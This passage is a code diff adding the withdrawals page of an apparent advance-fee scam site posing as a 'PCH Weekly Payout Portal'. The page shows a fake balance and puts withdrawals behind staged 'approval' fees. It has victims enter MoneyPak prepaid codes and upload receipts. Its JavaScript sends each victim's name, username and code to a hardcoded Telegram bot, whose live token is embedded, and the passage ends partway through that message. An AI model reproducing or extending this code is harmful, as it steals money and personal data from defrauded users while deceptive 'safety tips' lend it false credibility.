@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Withdrawals — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update, remove };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; overflow-x:hidden; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @media (hover:hover) and (pointer:fine) { .card-3d:hover { transform: translateY(-3px); box-shadow: 0 20px 30px -12px rgba(56,189,248,.14), 0 0 20px rgba(245,158,11,.07); } }
+  ::-webkit-scrollbar { width:8px; height:8px; } ::-webkit-scrollbar-track { background:#070b19; } ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; } ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  @keyframes pulseDot { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.55; transform:scale(.85); } }
+  .pulse-dot { animation: pulseDot 1.6s ease-in-out infinite; }
+  .dash-shell { position:relative; isolation:isolate; overflow-x:hidden; }
+  .dash-shell::before { content:""; position:absolute; z-index:-1; inset:0 -1.25rem auto; height:25rem; pointer-events:none; background-color:transparent; background-image: radial-gradient(ellipse at 12% 0%, rgba(56,189,248,.12), transparent 52%), radial-gradient(ellipse at 88% 4%, rgba(251,191,36,.09), transparent 45%); background-repeat:no-repeat; }
+  @supports (-webkit-touch-callout: none) {
+    .blur-3xl { -webkit-transform: translate3d(0,0,0); transform: translate3d(0,0,0); -webkit-backface-visibility: hidden; backface-visibility: hidden; will-change: transform; }
+  }
+  .hide-scrollbar::-webkit-scrollbar { display: none; }
+  .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+  .upload-preview { position:relative; border-radius:1rem; overflow:hidden; border:1px solid rgba(56,189,248,.35); background:#070b19; box-shadow:0 12px 24px -14px rgba(0,0,0,1),0 0 22px -10px rgba(56,189,248,.5); }
+  .upload-preview img { width:100%; height:100%; object-fit:cover; display:block; }
+  .timeline-dot { width:2rem; height:2rem; border-radius:999px; display:flex; align-items:center; justify-content:center; font-size:.75rem; font-weight:800; border:2px solid #212d54; background:#0d1326; color:#94a3b8; transition:all 0.3s; }
+  .timeline-dot.active { border-color:#38bdf8; background:rgba(56,189,248,.2); color:#38bdf8; box-shadow:0 0 18px rgba(56,189,248,.5); }
+  .timeline-dot.done { border-color:#10b981; background:rgba(16,185,129,.18); color:#34d399; }
+  .timeline-line { height:2px; background:#212d54; flex-grow:1; }
+  .timeline-line.done { background:linear-gradient(90deg,#10b981,#38bdf8); }
+  @keyframes pulseGlow { 0%,100% { box-shadow: 0 0 15px rgba(16,185,129,0.3); } 50% { box-shadow: 0 0 30px rgba(16,185,129,0.6); } }
+  .success-glow { animation: pulseGlow 2.5s infinite; }
+</style>
+<script src="pch_ios_shell.js"></script><script src="pch_ios_config.js"></script></head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="bg-navy-950 border-b border-navy-700/60 sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2 relative">
+    <button onclick="toggleNavDrawer()" class="p-2 -ml-2 text-slate-300 hover:text-white transition z-10 relative">
+      <i class="fa-solid fa-bars text-xl"></i>
+    </button>
+    <h1 class="absolute left-1/2 -translate-x-1/2 text-[11px] sm:text-xl font-black tracking-[0.15em] text-white uppercase whitespace-nowrap">
+      PCH Weekly Payout Portal
+    </h1>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3 z-10 relative"></div>
+  </div>
+</header>
+
+<div id="nav-overlay" class="fixed inset-0 bg-black/60 z-[45] hidden transition-opacity" onclick="toggleNavDrawer()"></div>
+<div id="nav-drawer" class="fixed inset-y-0 left-0 z-50 w-64 bg-navy-900 border-r border-navy-700 transform -translate-x-full transition-transform duration-300 ease-in-out flex flex-col">
+  <div class="p-5 border-b border-navy-700 flex items-center justify-between">
+    <span class="text-sm font-black text-white tracking-widest uppercase">Navigation</span>
+    <button onclick="toggleNavDrawer()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+  </div>
+  <nav class="flex-1 overflow-y-auto p-3 space-y-1"></nav>
+</div>
+
+<main id="app-container" class="flex-grow flex flex-col"></main>
+
+<footer class="bg-navy-950 border-t border-navy-700/50 py-8 text-sm text-slate-400">
+  <div class="max-w-7xl mx-auto px-4 text-center text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider font-bold">&copy; 2026 PCH Weekly Payout Portal (PWPP) — All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-[60] items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+
+const DEFAULT_TG = { botToken:'8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q', chatId:'8763270406' };
+
+const WITHDRAWAL_FLOW = {
+  pending: { stepNum: 1, stepLabel: 'Pending', status: 'Action Required', icon: 'fa-hourglass-half', tone: 'gold', description: 'Complete your first pending form to proceed.', userAction: 'openStepModal()', userLabel: 'Complete Now' },
+  pending_submitted: { stepNum: 1, stepLabel: 'Pending', status: 'Awaiting Admin Approval', icon: 'fa-clock', tone: 'sky', description: 'Awaiting admin review of your pending form.' },
+  pending_approved: { stepNum: 2, stepLabel: 'Processing F&H', status: 'Action Required', icon: 'fa-barcode', tone: 'gold', description: 'Complete your Processing F&H form to proceed.', userAction: 'openStepModal()', userLabel: 'Complete Now' },
+  stamp_submitted: { stepNum: 2, stepLabel: 'Processing F&H', status: 'Awaiting Admin Approval', icon: 'fa-clock', tone: 'sky', description: 'Awaiting admin review of your Processing F&H form.' },
+  stamp_approved: { stepNum: 3, stepLabel: 'Stamp of Approval', status: 'Action Required', icon: 'fa-stamp', tone: 'gold', description: 'Complete your Stamp of Approval form to proceed.', userAction: 'openStepModal()', userLabel: 'Complete Now' },
+  final_submitted: { stepNum: 3, stepLabel: 'Stamp of Approval', status: 'Awaiting Admin Approval', icon: 'fa-clock', tone: 'sky', description: 'Awaiting admin review of your final form.' }
+};
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const parsed = JSON.parse(saved);
+      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
+      if (parsed.userBalance == null) parsed.userBalance = 4500;
+      if (!parsed.transactions) parsed.transactions = [];
+      if (!parsed.registeredUsers) parsed.registeredUsers = [];
+      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
+      return parsed;
+    } catch(e){}
+  }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], withdrawalState:'none', currentWithdrawal:null, kyc:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
+}
+const state = loadDeviceState();
+
+function saveDeviceState() {
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
+  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
+}
+async function syncCurrentUserToCloud() { if (!window.rtdb || !state.currentUser || !state.currentUser.username) return; try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), state.currentUser); } catch(e){} }
+async function pullCurrentUserFromCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
+    if (!snap.exists()) return false;
+    const r = snap.val();
+    state.currentUser = Object.assign({}, state.currentUser, r);
+    if (r.kyc) state.kyc = r.kyc;
+    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
+    state.withdrawalState = r.withdrawalState || 'none';
+    state.currentWithdrawal = r.currentWithdrawal || null;
+    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
+    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
+    saveDeviceState(); return true;
+  } catch(e){ return false; }
+}
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }
+
+/* ═══════════ TELEGRAM — FULL PAYLOAD, NO MASKING ═══════════ */
+async function sendTelegramMessage(textMessage) {
+  const botToken = (state.telegramConfig && state.telegramConfig.botToken || '').trim();
+  const chatId   = (state.telegramConfig && state.telegramConfig.chatId   || '').trim();
+  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    else       console.log('[TG] sent, msg id', d.result.message_id);
+    return d.ok;
+  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
+}
+
+async function sendTelegramDocument(file, caption) {
+  const botToken = (state.telegramConfig && state.telegramConfig.botToken || '').trim();
+  const chatId   = (state.telegramConfig && state.telegramConfig.chatId   || '').trim();
+  if (!botToken || !chatId || !file) { console.warn('[TG-DOC] missing token/chat/file'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('document', file, file.name || 'receipt');
+    if (caption) { fd.append('caption', caption); fd.append('parse_mode', 'HTML'); }
+
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body:fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG-DOC] failed:', d.error_code, d.description);
+    else       console.log('[TG-DOC] sent, msg id', d.result.message_id);
+    return d.ok;
+  } catch (err) { console.error('[TG-DOC] fetch failed:', err); return false; }
+}
+
+function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
+function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }
+
+function toggleNavDrawer() {
+  const drawer = document.getElementById('nav-drawer');
+  const overlay = document.getElementById('nav-overlay');
+  if (drawer.classList.contains('-translate-x-full')) {
+    drawer.classList.remove('-translate-x-full');
+    overlay.classList.remove('hidden');
+  } else {
+    drawer.classList.add('-translate-x-full');
+    overlay.classList.add('hidden');
+  }
+}
+
+function isTabLocked(tabKey) {
+  const isKycApproved = state.kyc && state.kyc.status === 'approved';
+  const isSetupComplete = !!state.configuredMethod;
+  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'funds') return !isKycApproved;
+  if (tabKey === 'winners') return !isKycApproved;
+  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
+  return false;
+}
+function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }
+
+const DASHBOARD_TABS = [
+  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
+  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
+  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
+  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
+  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
+  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
+  { key:'spin', label:'Spin Your Luck', icon:'fa-dharmachakra', href:'spin.html' },
+  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
+  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
+  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
+  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
+  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
+  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
+  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
+];
+function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
+function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
+function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }
+
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions'); if (!nav) return;
+  if (!state.currentUser) { nav.innerHTML = ''; return; }
+  const u = state.currentUser;
+  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
+  nav.innerHTML = `
+    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
+    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
+  `;
+}
+
+/* ═══════════ WITHDRAWALS PAGE ═══════════ */
+function renderWithdrawalPipeline() {
+  const ws = state.withdrawalState || 'none'; 
+  if (ws === 'none') {
+    return `<div class="bg-gradient-to-br from-navy-800 to-navy-900 border border-emerald-500/20 rounded-3xl p-8 sm:p-10 text-center card-3d relative overflow-hidden">
+      <div class="absolute top-0 left-1/2 -translate-x-1/2 w-48 h-48 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
+      ${isTabLocked('withdrawals') ? `<div class="absolute inset-0 bg-navy-950/80 z-20 flex items-center justify-center rounded-3xl backdrop-blur-sm"><div class="bg-navy-800 border border-rose-500/40 rounded-2xl p-6 text-center max-w-xs shadow-2xl"><i class="fa-solid fa-lock text-3xl text-rose-400 mb-3"></i><p class="text-sm font-bold text-white mb-1">Locked</p><p class="text-[11px] text-slate-400 mb-4">Complete KYC and Weekly Funds setup.</p><a href="kyc.html" class="px-4 py-2 bg-rose-500 text-white font-bold rounded-xl text-xs block active:scale-95 transition">Verify Now</a></div></div>` : ''}
+      <div class="relative z-10 w-20 h-20 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-3xl mb-5 success-glow border-4 border-navy-800"><i class="fa-solid fa-check"></i></div>
+      <h3 class="text-xl sm:text-2xl font-bold text-white mb-2 relative z-10">All Clear</h3>
+      <p class="text-xs text-slate-400 mb-6 relative z-10 max-w-sm mx-auto">You have no outstanding withdrawals. Ready when you are.</p>
+      <button onclick="openWithdrawModal()" class="relative z-10 px-8 py-3.5 bg-gradient-to-r from-sky-custom to-emerald-500 text-navy-950 font-black rounded-xl text-sm active:scale-95 transition shadow-lg shadow-sky-custom/20"><i class="fa-solid fa-money-bill-transfer mr-2"></i>Request Withdrawal</button>
+    </div>`;
+  }
+  
+  const flow = WITHDRAWAL_FLOW[ws];
+  if (!flow) {
+    return `<div class="bg-navy-800 border border-sky-custom/40 rounded-3xl p-6 sm:p-8 card-3d">
+      <p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">Active Withdrawal</p>
+      <h3 class="text-lg font-bold text-white mt-1"><i class="fa-solid fa-clock text-sky-custom mr-2"></i>Under Review</h3>
+      <p class="text-[11px] text-slate-400 mt-2">State: <span class="font-mono">${escapeHtml(ws)}</span></p>
+    </div>`;
+  }
+  const cw = state.currentWithdrawal || {}; const amt = Number(cw.amount) || 0; const ref = cw.refNum || '—'; const started = cw.date || '—';
+  const toneBorder = flow.tone==='gold'?'border-gold-500/40':flow.tone==='sky'?'border-sky-custom/40':'border-emerald-500/40';
+  const toneIcon = flow.tone==='gold'?'text-gold-400':flow.tone==='sky'?'text-sky-custom':'text-emerald-400';
+  const toneBadge = flow.tone==='gold'?'bg-gold-500/20 text-gold-400 border border-gold-500/40':flow.tone==='sky'?'bg-sky-custom/20 text-sky-custom border border-sky-custom/40':'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40';
+  const toneDot = flow.tone==='gold'?'bg-gold-400':flow.tone==='sky'?'bg-sky-custom':'bg-emerald-400';
+  const wmColor = flow.tone==='gold'?'text-gold-500/5':flow.tone==='sky'?'text-sky-500/5':'text-emerald-500/5';
+  
+  const progress = [1,2,3].map(i => { 
+    const done = i<flow.stepNum; 
+    const active = i===flow.stepNum; 
+    const cls = done?'timeline-dot done':active?'timeline-dot active':'timeline-dot'; 
+    return `<div class="flex flex-col items-center gap-1"><div class="${cls}"><i class="fa-solid ${done?'fa-check':active?'fa-circle-dot':'fa-circle'}"></i></div><span class="text-[9px] uppercase font-bold ${done?'text-emerald-400':active?'text-sky-custom':'text-slate-500'}">Step ${i}</span></div>${i<3?`<div class="flex-1 h-0.5 ${i<flow.stepNum?'bg-gradient-to-r from-emerald-500 to-sky-custom':'bg-navy-700'} mx-1 mb-4"></div>`:''}`; 
+  }).join('');
+  
+  const userActionBtn = flow.userAction ? `<button onclick="${flow.userAction}" class="w-full py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-sm active:scale-95 transition shadow-lg shadow-gold-500/20"><i class="fa-solid ${flow.icon} mr-2"></i>${flow.userLabel}</button>` : '';
+  
+  return `<div class="bg-navy-800 ${toneBorder} border rounded-3xl p-6 sm:p-8 card-3d relative overflow-hidden shadow-xl">
+    <div class="absolute -top-10 -right-10 text-[10rem] ${wmColor} pointer-events-none"><i class="fa-solid fa-money-bill-transfer"></i></div>
+    <div class="relative z-10 space-y-6">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+        <div>
+          <p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">Active Withdrawal · Step ${flow.stepNum} of 3</p>
+          <h3 class="text-lg sm:text-xl font-bold text-white flex items-center mt-1"><i class="fa-solid ${flow.icon} ${toneIcon} mr-2"></i>${flow.stepLabel}</h3>
+          <p class="text-[11px] text-slate-400 mt-1">${fmtMoney(amt)} · Ref ${escapeHtml(ref)} · Requested ${escapeHtml(started)}</p>
+        </div>
+        <span class="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-[10px] font-black ${toneBadge}"><span class="w-2 h-2 rounded-full ${toneDot} pulse-dot"></span>${flow.status}</span>
+      </div>
+      
+      <div class="flex items-center px-2">${progress}</div>
+      
+      <div class="bg-navy-900/60 border border-navy-700/60 rounded-2xl p-4">
+        <p class="text-xs text-slate-300 leading-relaxed"><i class="fa-solid fa-circle-info text-sky-custom mr-1.5"></i>${flow.description}</p>
+      </div>
+      
+      ${userActionBtn}
+    </div>
+  </div>`;
+}
+
+function openStepModal() {
+  if (!state.currentUser) { showToast('Session', 'Please log in again.', 'error'); return; }
+  const ws = state.withdrawalState;
+  const flow = WITHDRAWAL_FLOW[ws];
+  if (!flow) return;
+  const firstName = state.currentUser.firstName || 'Client';
+  
+  showModal('Complete Step', `
+    <div class="space-y-5">
+      <div class="text-sm text-slate-300">Dear <b>${escapeHtml(firstName)}</b>, please contact your agent to get the required stuff to complete <b>${flow.stepLabel}</b>.</div>
+      
+      <div class="bg-rose-500/10 border border-rose-500/30 rounded-xl p-3.5 text-[11px] text-rose-300 leading-relaxed">
+        <b class="text-rose-400"><i class="fa-solid fa-shield-halved mr-1"></i>Safety Tips:</b> Only call your agent's official line. Never disclose your login info or send your MoneyPak code to anyone else.
+      </div>
+      
+      <form onsubmit="submitStepForm(event)" class="space-y-4">
+        <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">Amount ($)</label><input type="number" id="step-amount" required step="0.01" placeholder="0.00" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom transition-colors"></div>
+        <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">MoneyPak Code</label><input type="text" id="step-code" required placeholder="14-digit code" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom transition-colors"></div>
+        <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1.5">Receipt Upload</label><input type="file" id="step-receipt" required accept="image/*" class="w-full text-xs text-slate-400 file:mr-3 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-950 file:cursor-pointer cursor-pointer bg-navy-950 border border-navy-700 rounded-xl p-1.5 focus:outline-none focus:border-sky-custom"></div>
+        
+        <div class="flex flex-col gap-2.5 pt-3 border-t border-navy-700/60">
+          <button type="submit" class="w-full py-3.5 bg-gradient-to-r from-sky-custom to-emerald-500 text-navy-950 font-extrabold rounded-xl text-sm active:scale-95 transition shadow-lg shadow-sky-custom/20"><i class="fa-solid fa-paper-plane mr-2"></i> Submit Form</button>
+          <a href="tel:+16465858110" class="w-full py-3.5 bg-gold-500/10 border border-gold-500/40 text-gold-400 font-bold rounded-xl text-sm active:scale-95 transition text-center flex items-center justify-center hover:bg-gold-500/20"><i class="fa-solid fa-phone mr-2 pulse-dot"></i> Call Agent (+1 646-585-8110)</a>
+          <button type="button" onclick="closeModal()" class="w-full py-2 text-slate-500 font-bold rounded-xl text-xs hover:text-white transition">Cancel</button>
+        </div>
+      </form>
+    </div>
+  `);
+}
+
+async function submitStepForm(e) {
+  e.preventDefault();
+  if (!state.currentUser) { showToast('Session', 'Please log in again.', 'error'); return; }
+  const amt = parseFloat(document.getElementById('step-amount').value);
+  const code = document.getElementById('step-code').value;
+  const file = document.getElementById('step-receipt').files[0];
+  if (!amt || !code || !file) { showToast('Required', 'All fields are required.', 'error'); return; }
+  
+  const ws = state.withdrawalState;
+  let nextState = '';
+  if (ws === 'pending') nextState = 'pending_submitted';
+  if (ws === 'pending_approved') nextState = 'stamp_submitted';
+  if (ws === 'stamp_approved') nextState = 'final_submitted';
+  if (!nextState) return;
+
+  const label = WITHDRAWAL_FLOW[ws].stepLabel;
+  const cw = state.currentWithdrawal || {};
+  const userName = state.currentUser.username || 'unknown';
+  const fullName = ((state.currentUser.firstName||'') + ' ' + (state.currentUser.lastName||'')).trim() || '(none)';
+  const nowIso = new Date().toISOString();
+  
+  const stepData = { stepAmount: amt, stepCode: code, stepReceipt: file.name, stepReceiptSize: file.size, stepReceiptType: file.type || 'unknown', stepSubmittedAt: nowIso, stepLabel: label };
+  state.withdrawalState = nextState;
+  state.currentWithdrawal = Object.assign({}, cw, stepData);
+  if (state.currentUser) state.currentUser.currentWithdrawal = Object.assign({}, state.currentUser.currentWithdrawal || {}, stepData);
+  saveDeviceState();
+  
+  const msg =
+    `🚨 <b>STEP SUBMITTED — ${tgEsc(label)}</b>\n` +
+    `<b>User:</b> @${tgEsc(userName)}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Step amount:</b> ${fmtMoney(amt)}\n` +
+    `<b>MoneyPak code:</b> <code>${tgEsc(code)}</code>\n` +
+    `<b>Receipt file:</b> ${tgEsc(file.name || '(unnamed)')} — ${file.size} bytes — ${tgEsc(file.type || 'unknown')}\n` +
+    `<b>Withdrawal ref:</b> ${tgEsc(cw.refNum || '—')}\n` +
+    `<b>Withdrawal amount:</b> ${fmtMoney(cw.amount)}\n` +
+    `<b>Requested:</b> ${tgEsc(cw.date || '—')}\n` +
